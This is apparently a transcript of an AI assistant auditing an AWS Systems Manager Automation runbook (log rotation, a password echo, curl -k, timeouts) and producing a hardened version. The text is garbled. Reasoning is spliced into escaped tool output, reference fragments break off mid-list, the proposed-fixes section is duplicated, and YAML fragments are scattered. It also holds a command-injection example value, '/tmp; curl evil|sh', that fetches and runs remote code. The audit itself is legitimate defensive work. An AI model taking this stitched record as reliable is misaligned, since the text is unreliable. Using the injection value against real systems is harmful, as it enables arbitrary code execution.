{"id": "06a6a28b-8463-4299-8073-460ed1c02355", "role": "user", "content": [{"text": "Review this Automation runbook for security problems before I share it with other teams, and give me a hardened version:

```yaml
schemaVersion: '0.3'
description: Restarts the app service and rotates its log directory.
assumeRole: [redacted ARN]
parameters:
  InstanceId:
    type: String
  LogPath:
    type: String
    allowedPattern: '.*'
  DbPassword:
    type: SecureString
mainSteps:
  - name: RotateLogs
    action: aws:runCommand
    onFailure: Continue
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds: ['{{InstanceId}}']
      Parameters:
        commands:
          - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
          - echo "restarting with password {{DbPassword}}"
          - curl -k https://internal-api.example.com/notify
  - name: CheckHealth
    action: aws:executeScript
    timeoutSeconds: 1200
    onCancel: step:Wait
    inputs:
      Runtime: python3.11
      Handler: handler
      Script: |-
        import boto3
        def handler(events, context):
            return boto3.client('ec2').describe_instance_status()
  - name: Wait
    action: aws:sleep
    inputs: {Duration: PT10S}
```", "type": "text"}], "created_at": null}

I'm also noting the command chains tar and rm with && so a failed archive prevents deletion, which is good, though I'm debating whether to flag the world-writable /var/tmp archive destination as a symlink attack risk, deciding to keep the report focused on findings backed by concrete checks rather than speculative issues.

Then I'm looking at the DbPassword parameter, flagging it as a Critical issue since it's typed SecureString but gets echoed in plaintext in the command—since the runbook doesn't actually use the password for anything beyond that echo, I'm thinking the right fix is to drop the echo entirely and convert the parameter to a non-secret name reference, even though that risks leaving the parameter unused.

I'm also noting that the runbook's description claims it restarts the app service, but there's no actual restart step anywhere—just the password echo—so that's a documentation mismatch worth flagging, and I should recommend rotating the exposed password since it's been logged in execution history, while being careful not to fabricate a restart command myself.

Moving on, I'm flagging the hard-coded assumeRole ARN as a High severity issue since it would break if the runbook were shared across accounts, and I'm proposing replacing it with an AutomationAssumeRole parameter instead. CheckHealth's 1200-second timeout exceeds the 600-second limit, so that needs fixing too, and I'm now examining the onCancel routing to Wait, which isn't a valid target since sleep steps aren't supported there—I'll propose switching it to Abort as the simplest documented fix rather than inventing a meaningless cleanup step, while noting that teams needing real cleanup (like removing temp log files) could add their own step. Every check\\nin this chapter is grounded in a public Systems Manager or IAM documentation page, cited in\\n[references/automation/hardening-detection-rules.md](references/automation/hardening-detection-rules.md).\\n\\nThis review is static. It reads the document only. It doesn\\'t run the runbook, and it doesn\\'t\\ncheck the IAM policy of the role the runbook assumes; review that role separately.\\n\\n## When to use\\n\\n- A user asks to review or harden a runbook they wrote, before publishing or sharing it.\\n- A release or prevention review includes account-owned runbooks.\\n\\nTo choose a runbook for a problem, hand off to\\n[references/automation/runbook-discovery.md](references/automation/runbook-discovery.md); to run one, to\\n[references/automation/execution.md](references/automation/execution.md).\\n\\n## Workflow\\n\\nCopy this checklist and work through it in order:\\n\\n- [ ] Step 1: Read the document (Phase 1)\\n- [ ] Step 2: Scan with every check in the detection rules (Phase 2)\\n- [ ] Step 3: Apply, propose or flag fixes (Phase 3)\\n- [ ] Step 4: Write the report and the hardened document (Phase 4)\\n- [ ] Step 5: Check the output, then present it\\n\\n## Phase 1: Read the document\\n\\n1. Get the document. If the user names a runbook in their account, call\\n   `aws ssm get-document --name <name> --region <region>`, and add `--document-version <n>` if\\n   they named a version. Otherwise use the content the user provides.\\n2. Note the format (YAML or JSON). The hardened document must use the same format.\\n3. Check `schemaVersion`. If it isn\\'t `\"0.3\"`, stop: Automation runbooks must use schema version\\n   0.3. A `2.2` document is a Command document, which this chapter doesn\\'t cover.\\n4. List `parameters` (name, type, constraints), `assumeRole`, and every step in `mainSteps`\\n   (name, action, inputs, `onFailure`, `onCancel`, `timeoutSeconds`, `maxAttempts`), including\\n   steps nested in `aws:loop`.\\n\\n## Phase 2: Scan\\n\\nOpen [references/automation/hardening-detection-rules.md](references/automation/hardening-detection-rules.md) and apply every check, in\\norder:\\n\\n| # | Check | Severity |\\n|---|---|---|\\n| 1 | Command injection: parameters or step outputs interpolated into shell or PowerShell commands | Critical |\\n| 2 | Secrets: hard-coded credentials, secret values passed as parameters, secrets in outputs | Critical |\\n| 3 | Parameter validation: missing or weak `allowedPattern`, `allowedValues`, length and item limits | High (Critical for parameters used in commands) |\\n| 4 | Role: missing `assumeRole` where the runbook needs it | High |\\n| 5 | Step limits: timeouts beyond documented limits | Medium |\\n| 6 | Failure and cancel routing: invalid `onFailure` / `onCancel` values or targets | Medium |\\n| 7 | Approval steps: `aws:approve` misconfiguration | Medium |\\n| 8 | Cross-account role assumption from a step | Medium |\\n| 9 | TLS verification disabled in a command or script | High |\\n| 10 | Document structure: schema version, required fields, parameter types, step names | Low |\\n\\nFor each finding record the check number, severity, the parameter or step (and JSON path), what is\\nwrong, and the documentation page that backs it.\\n\\nNever repeat a secret\\'s value in a finding. Give its location and tell the user to rotate it.\\n\\n## Phase 3: Fix\\n\\nUse [references/automation/hardening-fix-patterns.md](references/automation/hardening-fix-patterns.md). Fixes come in three kinds:\\n\\n| Kind | Applies to | What you do |\\n|---|---|---|\\n| Apply | Deterministic changes to existing fields: add or tighten `allowedPattern`, fix an ARN pattern\\'s partition, correct a timeout above a documented maximum, correct an invalid parameter type | Change the document directly. Don\\'t add steps |\\n| Propose | Changes that alter behaviour: rewriting a command that interpolates parameters, moving a secret to Parameter Store, adding `assumeRole`, rerouting `onCancel` | Apply in the hardened document, and show each change as BEFORE / AFTER with the reason |\\n| Flag | Problems that need a redesign, or where the right fix depends on facts outside the document | Don\\'t change the document. Describe the problem and what a redesign must address |\\n\\nFlag rather than fix when proposed changes would touch most of the steps; patching that much\\nleaves a document that is harder to review than a rewrite.\\n\\nDon\\'t weaken an existing control to make the document pass, and don\\'t remove a parameter the\\ndocument needs; change how it is used instead.\\n\\n## Phase 4: Report\\n\\nWrite the report with the structure in\\n[references/automation/hardening-report-template.md](references/automation/hardening-report-template.md): a summary table by severity,\\napplied fixes, proposed fixes as BEFORE / AFTER with their source, flagged items, checks with no\\nfindings, what the review didn\\'t cover, and the complete hardened document in the input\\'s format.\\n\\n## Phase 5: Check the output\\n\\nBefore presenting the report, confirm:\\n\\n- The hardened document parses as YAML or JSON, and every `allowedPattern` in it is still a\\n  valid regular expression.\\n- Every finding names a check from the detection rules and its source page.\\n- No secret value from the input appears anywhere in the report or the hardened document.\\n- Every difference between the input and the hardened document is listed as an applied or\\n  proposed fix.\\n\\nFix anything that doesn\\'t hold before you answer.\\n\\n## Gotchas\\n\\n- Steps inside an `aws:loop` (`inputs.Steps`) are steps too; scan them.\\n- A parameter name containing \"key\" is often an identifier (`KeyName`, `KmsKeyId`, `S3Key`), not a\\n  secret.\\n- `allowedPattern` protects parameters only. A value from `{{StepName.OutputName}}` is never\\n  validated by it.\\n- Patterns must work in both Java regex and Go `regexp`: avoid lookahead and backreferences.\\n- In JSON documents every backslash in a pattern is doubled; in YAML, single-quote the pattern.\\n\\n## Constraints\\n\\n- Report only findings backed by a check in the detection rules.\\n- Never print a secret\\'s value.\\n- Keep the document\\'s behaviour, apart from the fixes you list.\\n- The hardened document must still parse: in JSON, escape backslashes in regular expressions\\n  (`\\\\` becomes `\\\\\\\\`); in YAML, single-quote patterns that contain `\\\\`, `{` or `}`.\\n'}]", "status": "success", "type": "tool_result"}, {"id": "tooluse_HfwPrrfDKRylIUD4b7azfg", "content": "[{'text': '# Detection rules\\n\\nEach check names the public documentation it relies on. Page names used below:\\n\\n| Short name | Page |\\n|---|---|\\n| Parameters | [Data elements and parameters](https://docs.aws.amazon.com/systems-manager/latest/userguide/documents-syntax-data-elements-parameters.html) |\\n| Schemas | [Schemas, features, and examples](https://docs.aws.amazon.com/systems-manager/latest/userguide/documents-schemas-features.html) |\\n| Sharing | [Sharing SSM documents](https://docs.aws.amazon.com/systems-manager/latest/userguide/documents-ssm-sharing.html) |\\n| Actions | [Systems Manager Automation actions reference](https://docs.aws.amazon.com/systems-manager/latest/userguide/automation-actions.html), section \"Properties shared by all actions\" |\\n| Resource types | [Using inputs from other AWS services](https://docs.aws.amazon.com/systems-manager/latest/userguide/populating-input-parameters.html) |\\n| Running | [Running an automation](https://docs.aws.amazon.com/systems-manager/latest/userguide/automation-working-executing.html) |\\n| Script considerations | [Considerations for scripts in runbooks](https://docs.aws.amazon.com/systems-manager/latest/userguide/automation-document-script-considerations.html) |\\n| Parameter Store in Run Command | [Using Parameter Store parameters in Run Command](https://docs.aws.amazon.com/systems-manager/latest/userguide/sysman-param-runcommand.html) |\\n| Security best practices | [Security best practices for Systems Manager](https://docs.aws.amazon.com/systems-manager/latest/userguide/security-best-practices.html) |\\n| Data protection | [Data protection in Systems Manager](https://docs.aws.amazon.com/systems-manager/latest/userguide/data-protection.html) |\\n| ARNs | [IAM identifiers: ARN format](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference-arns.html) |\\n| External ID | [Access to AWS accounts owned by third parties](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_common-scenarios_third-party.html) |\\n\\nAction pages are linked where used.\\n\\n## 1. Command injection (Critical)\\n\\nCommands run in `aws:runCommand` steps (through `AWS-RunShellScript`, `AWS-RunPowerShellScript` or\\nanother Command document) and in `aws:executeScript` scripts that start processes.\\n\\nFind:\\n\\n1. Every `{{ParameterName}}` inside `aws:runCommand` \u2192 `inputs.Parameters.commands`, or inside any\\n   other input of a Command document that ends up in a command line.\\n2. Every `{{StepName.OutputName}}` used in the same places.\\n3. Format: YAML   Schema: 0.3   Steps: 3   Parameters: 3

This is a static review of the document only. I didn't run the runbook or change anything in your account.

| Severity | Found | Applied | Proposed | Flagged |
|---|---|---|---|---|
| Critical | 2 | 0 | 2 | 0 |
| High | 3 | 1 | 2 | 0 |
| Medium | 2 | 1 | 1 | 0 |
| Low | 1 | 1 | 0 | 0 |

### Applied fixes
- **`InstanceId` (check 3, High):** It had no validation. I added `allowedPattern: '^i-(?:[a-f0-9]{8}|[a-f0-9]{17})$'`. (Source: Parameters page)
- **`CheckHealth.timeoutSeconds` (check 5, Medium):** I lowered 1200 to 600, the documented maximum for `aws:executeScript`. (Source: executeScript action page)
- **`DbPassword` type (check 10, Low):** `SecureString` isn't a valid document parameter type. I replaced it with a `String` that holds a Parameter Store parameter name. This goes together with the secrets fix below. (Source: Parameters page)

### Proposed fixes

**PROPOSED FIX 1: Constrain `LogPath` (Critical, checks 1 and 3)**
- **Issue:** `LogPath` is placed in a shell command with `allowedPattern: '.*'`, which accepts anything. A value like `/tmp; curl evil|sh` runs arbitrary commands as root on the instance. A value like `/` turns `rm -rf {{LogPath}}/*` into `rm -rf //*`, which wipes the filesystem. Because `&&` chains the two commands, a `..` path also passes the archive step and then deletes.
- **BEFORE:**
  ```yaml
  LogPath:
    type: String
    allowedPattern: '.*'
  # ...
  - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
  ```
- **AFTER:**
  ```yaml
  LogPath:
    type: String
    description: (Required) Absolute path of the log directory under /var/log.
    allowedPattern: '^/var/log/[A-Za-z0-9_-]{1,64}(/[A-Za-z0-9_-]{1,64}){0,4}$'
  # ...
  - tar czf /var/tmp/logs.tgz '{{LogPath}}' && rm -rf '{{LogPath}}'/*
  ```
- **Assumption:** The `/var/log/` prefix is my guess at what you intend. The pattern also excludes dots, so `..` can't get through. Widen the prefix or the character set if your directories need it, but keep it anchored and free of `.` and `;|&$` and quotes.
- **Source:** Schemas page ("Parameter security best practices"), Parameters page.

**PROPOSED FIX 2: Stop passing the password as a parameter and echoing it (Critical, check 2)**
- **Issue:** `DbPassword` is a secret parameter. It is written into command text and printed with `echo`, so the value ends up in Automation execution history, Run Command history and output, and any log destination configured for them.
- **BEFORE:**
  ```yaml
  DbPassword:
    type: SecureString
  # ...
  - echo "restarting with password {{DbPassword}}"
  ```
- **AFTER:**
  ```yaml
  DbPasswordParameterName:
    type: String
    description: (Required) Name of the SecureString parameter that holds the database password.
    allowedPattern: '^[a-zA-Z0-9_./-]{1,1011}$'
  # ...
  - echo "restarting application service"
  ```
- **Follow-up:** Any real use of the password should read it at run time with `aws ssm get-parameter --with-decryption` and pass it to the tool through stdin or a restricted file, never as an argument. The instance profile then needs `ssm:GetParameter` on that parameter and `kms:Decrypt` on its key.
- **Rotate the password** that was used in previous executions. I haven't seen a value, but it will be in the history of every past run.
- **Source:** Data protection, Security best practices, Parameter Store in Run Command, Parameters page.

**PROPOSED FIX 3: Make the assume role a parameter (High, check 4)**
- **Issue:** `assumeRole` is hard-coded to one account's `AppOpsRole`. Other teams and accounts can't use the runbook without editing it, and anyone who can start it runs with that role's permissions.
- **BEFORE:** `assumeRole: [redacted ARN]`
- **AFTER:**
  ```yaml
  assumeRole: '{{AutomationAssumeRole}}'
  parameters:
    AutomationAssumeRole:
      type: AWS::IAM::Role::Arn
      description: (Required) ARN of the role that Automation assumes to run this runbook.
  ```
- **Source:** Running an automation, Script considerations.

**PROPOSED FIX 4: Re-enable TLS verification (High, check 9)**
- **Issue:** `curl -k` skips certificate validation, so the notification call can be intercepted or spoofed.
- **BEFORE:** `curl -k https://internal-api.example.com/notify`
- **AFTER:** `curl https://internal-api.example.com/notify`
- **Note:** If this fails afterwards, fix the certificate on the endpoint, or install your private CA on the instances. Don't put the flag back.
- **Source:** Data protection.

**PROPOSED FIX 5: Fix the invalid `onCancel` target (Medium, check 6)**
- **Issue:** `onCancel: step:Wait` points at an `aws:sleep` step, which can't be an `onCancel` target. The step would be rejected or never run as intended.
- **BEFORE:** `onCancel: step:Wait`
- **AFTER:** `onCancel: Abort`
- **Note:** If you need cleanup on cancel, such as removing `/var/tmp/logs.tgz`, add a short `aws:executeScript` or `aws:executeAwsApi` step and point `onCancel` at it. The cancel path has to finish within 2 minutes.
- **Source:** Actions reference, "Properties shared by all actions".

### Flagged for redesign
None.

### For your confirmation
- `RotateLogs` has `onFailure: Continue`. If `tar` fails, the `&&` stops the `rm`, but the runbook carries on to `CheckHealth` and can report success. Confirm that is what you want. I left it as it is.

### Checks with no findings
- 7 (approval steps) and 8 (cross-account role assumption).

### Not covered by this review
- The IAM policy of the assume role. This matters here, because it should allow only `ssm:SendCommand` on the intended instances and `ec2:DescribeInstanceStatus`.
- The `AWS-RunShellScript` document itself.
- Things I noticed that none of the checks cover, and so didn't change:
  - The description says the runbook restarts the service, but no step does.
  - `DbPasswordParameterName` is now unused. Remove it if nothing needs the password.
  - `CheckHealth` calls `describe_instance_status()` for all instances and doesn't use `InstanceId`.

    description: (Required) Name of the SecureString parameter that holds the database password.

    action: aws:executeScript
    timeoutSeconds: 600
    onCancel: Abort
    inputs:
      Runtime: python3.11
      Handler: handler
      Script: |-
        import boto3
        def handler(events, context):
            return boto3.client('ec2').describe_instance_status()

    inputs: {Duration: PT10S}

### Proposed fixes

**PROPOSED FIX 1: Constrain `LogPath` (Critical, checks 1 and 3)**
- **Issue:** `LogPath` is placed in a shell command with `allowedPattern: '.*'`, which accepts anything. A value like `/tmp; curl evil|sh` runs arbitrary commands as root on the instance. A value like `/` turns `rm -rf {{LogPath}}/*` into `rm -rf //*`, which wipes the filesystem. Because `&&` chains the two commands, a `..` path also passes the archive step and then deletes.
- **BEFORE:**
  ```yaml
  LogPath:
    type: String
    allowedPattern: '.*'
  # ...
  - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
  ```
- **AFTER:**
  ```yaml
  LogPath:
    type: String
    description: (Required) Absolute path of the log directory under /var/log.
    allowedPattern: '^/var/log/[A-Za-z0-9_-]{1,64}(/[A-Za-z0-9_-]{1,64}){0,4}$'
  # ...
  - tar czf /var/tmp/logs.tgz '{{LogPath}}' && rm -rf '{{LogPath}}'/*
  ```
- **Assumption:** The `/var/log/` prefix is my guess at what you intend. The pattern also excludes dots, so `..` can't get through. Widen the prefix or the character set if your directories need it, but keep it anchored and free of `.` and `;|&$` and quotes.
- **Source:** Schemas page ("Parameter security best practices"), Parameters page.

**PROPOSED FIX 2: Stop passing the password as a parameter and echoing it (Critical, check 2)**
- **Issue:** `DbPassword` is a secret parameter. It is written into command text and printed with `echo`, so the value ends up in Automation execution history, Run Command history and output, and any log destination configured for them.
- **BEFORE:**
  ```yaml
  DbPassword:
    type: SecureString
  # ...
  - echo "restarting with password {{DbPassword}}"
  ```
- **AFTER:**
  ```yaml
  DbPasswordParameterName:
    type: String
    description: (Required) Name of the SecureString parameter that holds the database password.
    allowedPattern: '^[a-zA-Z0-9_./-]{1,1011}$'
  # ...
  - echo "restarting application service"
  ```
- **Follow-up:** Any real use of the password should read it at run time with `aws ssm get-parameter --with-decryption` and pass it to the tool through stdin or a restricted file, never as an argument. The instance profile then needs `ssm:GetParameter` on that parameter and `kms:Decrypt` on its key.
- **Rotate the password** that was used in previous executions. I haven't seen a value, but it will be in the history of every past run.
- **Source:** Data protection, Security best practices, Parameter Store in Run Command, Parameters page.

**PROPOSED FIX 3: Make the assume role a parameter (High, check 4)**
- **Issue:** `assumeRole` is hard-coded to one account's `AppOpsRole`. Other teams and accounts can't use the runbook without editing it, and anyone who can start it runs with that role's permissions.
- **BEFORE:** `assumeRole: [redacted ARN]`
- **AFTER:**
  ```yaml
  assumeRole: '{{AutomationAssumeRole}}'
  parameters:
    AutomationAssumeRole:
      type: AWS::IAM::Role::Arn
      description: (Required) ARN of the role that Automation assumes to run this runbook.
  ```
- **Source:** Running an automation, Script considerations.

**PROPOSED FIX 4: Re-enable TLS verification (High, check 9)**
- **Issue:** `curl -k` skips certificate validation, so the notification call can be intercepted or spoofed.
- **BEFORE:** `curl -k https://internal-api.example.com/notify`
- **AFTER:** `curl https://internal-api.example.com/notify`
- **Note:** If this fails afterwards, fix the certificate on the endpoint, or install your private CA on the instances. Don't put the flag back.
- **Source:** Data protection.

**PROPOSED FIX 5: Fix the invalid `onCancel` target (Medium, check 6)**
- **Issue:** `onCancel: step:Wait` points at an `aws:sleep` step, which can't be an `onCancel` target. The step would be rejected or never run as intended.
- **BEFORE:** `onCancel: step:Wait`
- **AFTER:** `onCancel: Abort`
- **Note:** If you need cleanup on cancel, such as removing `/var/tmp/logs.tgz`, add a short `aws:executeScript` or `aws:executeAwsApi` step and point `onCancel` at it. The cancel path has to finish within 2 minutes.
- **Source:** Actions reference, "Properties shared by all actions".

- The `AWS-RunShellScript` document itself.
- Things I noticed that none of the checks cover, and so didn't change:

schemaVersion: '0.3'
description: Restarts the app service and rotates its log directory.
assumeRole: '{{AutomationAssumeRole}}'
parameters:
  AutomationAssumeRole:
    type: AWS::IAM::Role::Arn
    description: (Required) ARN of the role that Automation assumes to run this runbook.
  InstanceId:
    type: String
    description: (Required) ID of the EC2 instance to run the log rotation on.
    allowedPattern: '^i-(?:[a-f0-9]{8}|[a-f0-9]{17})$'
  LogPath:
    type: String
    description: (Required) Absolute path of the log directory under /var/log.
    allowedPattern: '^/var/log/[A-Za-z0-9_-]{1,64}(/[A-Za-z0-9_-]{1,64}){0,4}$'
  DbPasswordParameterName:
    type: String
    description: (Required) Name of the SecureString parameter that holds the database password.
    allowedPattern: '^[a-zA-Z0-9_./-]{1,1011}$'
mainSteps:
  - name: RotateLogs
    action: aws:runCommand
    onFailure: Continue
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds: ['{{InstanceId}}']
      Parameters:
        commands:
          - tar czf /var/tmp/logs.tgz '{{LogPath}}' && rm -rf '{{LogPath}}'/*
          - echo "restarting application service"
          - curl https://internal-api.example.com/notify
  - name: CheckHealth
    action: aws:executeScript
    timeoutSeconds: 600
    onCancel: Abort
    inputs:
      Runtime: python3.11
      Handler: handler
      Script: |-
        import boto3
        def handler(events, context):
            return boto3.client('ec2').describe_instance_status()
  - name: Wait
    action: aws:sleep
    inputs: {Duration: PT10S}
```
